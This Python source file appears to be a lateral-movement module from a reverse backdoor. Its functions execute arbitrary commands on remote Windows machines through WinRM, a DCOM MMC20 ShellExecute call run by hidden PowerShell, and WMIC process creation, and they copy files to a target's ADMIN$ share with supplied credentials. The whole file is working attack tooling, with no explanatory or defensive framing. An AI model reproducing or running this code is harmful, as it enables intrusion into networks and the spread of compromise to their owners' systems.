import os
import subprocess


def winrm_execute(protocol, target_ip, username, password, command):
    if os.name != 'nt':
        protocol.send('[-] WinRM execution is Windows-only')
        return
    proto = 'https' if os.environ.get('REVERSE_BACKDOOR_TLS') else 'http'
    try:
        result = subprocess.run(
            f'winrs /r:{proto}://{target_ip}:5986/wsman /u:{username} /p:{password} '
            f'"cmd.exe /c {command}"',
            shell=True, capture_output=True, timeout=30
        )
        out = (result.stdout + result.stderr).decode('utf-8', errors='replace').strip()
        protocol.send(f'[+] WinRM result:\n{out}' if out else '[*] WinRM executed (no output)')
    except Exception as e:
        protocol.send(f'[-] WinRM error: {str(e)}')


def dcom_execute(protocol, target_ip, command):
    if os.name != 'nt':
        protocol.send('[-] DCOM execution is Windows-only')
        return
    ps_cmd = (
        f'$o=[Activator]::CreateInstance([Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880",'
        f'"{target_ip}"));'
        f'$o.Document.Application.ShellExecute("cmd.exe","/c {command}","C:\\\\Windows\\\\System32",$null,0)'
    )
    try:
        result = subprocess.run(
            ['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-C', ps_cmd],
            capture_output=True, timeout=20
        )
        err = result.stderr.decode('utf-8', errors='replace').strip()
        if err:
            protocol.send(f'[-] DCOM error: {err}')
        else:
            protocol.send(f'[+] DCOM executed on {target_ip}')
    except Exception as e:
        protocol.send(f'[-] DCOM error: {str(e)}')


def wmiexec_execute(protocol, target_ip, username, password, command):
    if os.name != 'nt':
        protocol.send('[-] WMI execution is Windows-only')
        return
    try:
        result = subprocess.run(
            f'wmic /node:"{target_ip}" /user:"{username}" /password:"{password}" '
            f'process call create "cmd.exe /c {command}"',
            shell=True, capture_output=True, timeout=20
        )
        out = (result.stdout + result.stderr).decode('utf-8', errors='replace')
        if 'ProcessId' in out or 'ReturnValue = 0' in out:
            protocol.send(f'[+] WMIC process created on {target_ip}')
        else:
            protocol.send(f'[-] WMIC failed: {out[:300]}')
    except Exception as e:
        protocol.send(f'[-] WMIC error: {str(e)}')


def smb_copy(protocol, source, target_ip, dest, username, password):
    if os.name != 'nt':
        protocol.send('[-] SMB copy is Windows-only')
        return
    try:
        subprocess.run(
            f'net use \\\\{target_ip}\\ADMIN$ /user:{username} {password}',
            shell=True, capture_output=True, timeout=10
        )
        result = subprocess.run(
            f'copy /y "{source}" "\\\\{target_ip}\\ADMIN$\\{dest}"',
            shell=True, capture_output=True, timeout=15
        )
        if result.returncode == 0:
            protocol.send(f'[+] Copied to \\\\{target_ip}\\ADMIN$\\{dest}')
        else:
            err = result.stderr.decode('utf-8', errors='replace').strip()
            protocol.send(f'[-] Copy failed: {err}')
    except Exception as e:
        protocol.send(f'[-] SMB copy error: {str(e)}')
